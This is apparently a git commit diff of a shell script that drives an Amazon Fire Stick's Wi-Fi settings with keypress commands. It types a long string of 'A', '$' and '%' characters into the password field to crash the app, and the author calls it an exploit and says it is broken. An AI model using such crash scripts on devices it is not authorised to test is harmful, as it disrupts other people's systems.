b0be9725aea205d8ca855ec5f35d72b0b2d905c9
FreeBSDKernel9-0 <coconutrepairs@gmail.com>
2026-07-05 20:26:30 +0100

    Going back to my old script. (Gonna release this - broken - just to show how it's supposed to work).

--- Fire Stick/InputSanitizationFlawLeadingToAppCrash.sh
+++ Fire Stick/InputSanitizationFlawLeadingToAppCrash.sh
@@ -1,21 +1,212 @@
 # Start the Network settings (Amazon will re-route this to their Network tab, rather than Android's)
 am start -a android.settings.WIFI_SETTINGS
 
+# Unfocus the tab, and hit Select (Puts you to the top network, which doesn't matter for this bug, unless your top network is connected already)
+input keyevent 61
+input keyevent 66
 # FAILSAFE IN CASE THE TOP NETWORK IS YOURS, AND ALREADY CONNECTED (lol)
-if ip route | grep -q "wlan0"; then
-    input keyevent 20 && input keyevent 66
-else
-    input keyevent 61 && input keyevent 66
-fi
+ip route | grep -q "wlan0" && (input keyevent 20; input keyevent 66) || (input keyevent 61; input keyevent 66)
 
-# Use input text instead
-input text "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$4"
+# Manually enter the string (Bunch of 'A', '%', and '$' signs)
+input keyevent 20
+input keyevent 20
+input keyevent 20
+input keyevent 66 # Manually go down 3 letters, to Caps Lock, and hit Enter
 
-# Go to the 'Submit' button
+# Go up to 'A'
+input keyevent 19
+input keyevent 19
+input keyevent 19
+
+# Hit Enter a bunch, until we hit the normal character limit (We have to do this manually, at least in my case)
+input keyevent 66
+input keyevent 66
+input keyevent 66
+input keyevent 66
+input keyevent 66
+input keyevent 66
+input keyevent 66
+input keyevent 66
+input keyevent 66
+input keyevent 66
+input keyevent 66
+input keyevent 66
+input keyevent 66
+input keyevent 66
+input keyevent 66
+input keyevent 66
+input keyevent 66
+input keyevent 66
+input keyevent 66
+input keyevent 66
+input keyevent 66
+input keyevent 66
+input keyevent 66
+input keyevent 66
+input keyevent 66
+input keyevent 66
+input keyevent 66
+input keyevent 66
+input keyevent 66
+input keyevent 66
+input keyevent 66
+input keyevent 66
+input keyevent 66
+input keyevent 66
+input keyevent 66
+
+# Go down to the 'Special Characters' section, and hit Enter (This is the detonator where the actual crash is gonna happen)
+
 input keyevent 20
-sleep 5
 input keyevent 20
-sleep 5
+input keyevent 20
 input keyevent 22
-sleep 5
+input keyevent 66
+
+# Once on there, go Up + Right and hit Enter a bunch (string of '$')
+
+input keyevent 19
+input keyevent 22
+
+input keyevent 66
+input keyevent 66
+input keyevent 66
+input keyevent 66
+input keyevent 66
+input keyevent 66
+input keyevent 66
+input keyevent 66
+input keyevent 66
+input keyevent 66
+input keyevent 66
+input keyevent 66
+input keyevent 66
+input keyevent 66
+input keyevent 66
+input keyevent 66
+input keyevent 66
+input keyevent 66
+input keyevent 66
+input keyevent 66
+input keyevent 66
+input keyevent 66
+input keyevent 66
+input keyevent 66
+input keyevent 66
+input keyevent 66
+input keyevent 66
+input keyevent 66
+input keyevent 66
+input keyevent 66
+input keyevent 66
+input keyevent 66
+input keyevent 66
+input keyevent 66
+input keyevent 66
+input keyevent 66
+
+# Hit Left + Up + Up and hit Enter a bunch (string of "")
+
+input keyevent 21
+input keyevent 19
+input keyevent 19
+
+input keyevent 66
+input keyevent 66
+input keyevent 66
+input keyevent 66
+input keyevent 66
+input keyevent 66
+input keyevent 66
+input keyevent 66
+input keyevent 66
+input keyevent 66
+input keyevent 66
+input keyevent 66
+input keyevent 66
+input keyevent 66
+input keyevent 66
+input keyevent 66
+input keyevent 66
+input keyevent 66
+input keyevent 66
+input keyevent 66
+input keyevent 66
+input keyevent 66
+
+# Hit Right + Enter a bunch (string of '%'), then hit Left to make the next part easier
+
+input keyevent 22
+
+input keyevent 66
+input keyevent 66
+input keyevent 66
+input keyevent 66
+input keyevent 66
+input keyevent 66
+input keyevent 66
+input keyevent 66
+input keyevent 66
+input keyevent 66
+input keyevent 66
+input keyevent 66
+input keyevent 66
+input keyevent 66
+input keyevent 66
+input keyevent 66
+input keyevent 66
+input keyevent 66
+input keyevent 66
+input keyevent 66
+input keyevent 66
+input keyevent 66
+
+input keyevent 21
+
+# One last string of '$' (this makes the exploit work)
+
+input keyevent 66
+input keyevent 66
+input keyevent 66
+input keyevent 66
+input keyevent 66
+input keyevent 66
+input keyevent 66
+input keyevent 66
+input keyevent 66
+input keyevent 66
+input keyevent 66
+input keyevent 66
+input keyevent 66
+input keyevent 66
+input keyevent 66
+input keyevent 66
+input keyevent 66
+input keyevent 66
+input keyevent 66
+input keyevent 66
+input keyevent 66
+input keyevent 66
+input keyevent 66
+input keyevent 66
+input keyevent 66
+input keyevent 66
+input keyevent 66
+input keyevent 66
+input keyevent 66
+input keyevent 66
+input keyevent 66
+input keyevent 66
+input keyevent 66
+input keyevent 66
+input keyevent 66
+input keyevent 66
+
+# Hit 'Submit' to trigger the error, and (if we filled the memory up enough) Home Screen Kick
+
+input keyevent 20
+input keyevent 22
+input keyevent 22
+input keyevent 22
+input keyevent 20
 input keyevent 66
